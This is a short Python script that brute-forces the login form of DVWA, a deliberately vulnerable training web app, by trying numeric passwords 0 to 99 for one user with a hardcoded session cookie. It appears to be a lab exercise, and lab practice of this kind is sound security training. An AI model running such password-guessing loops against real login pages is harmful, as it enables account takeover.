import requests

security = "low"
phpsession = "n5tfvbhfha4jbnqu95vh82g0n2"

cookies = {"security": security, "PHPSESSID": phpsession}

for i in range(100):
    req = requests.get("http://dvwa.spro.ink/vulnerabilities/brute/?username=brood&password=%d&Login=Login" % i, cookies=cookies)
    d = req.text
    if "incorrect" in d:
        continue
    print i
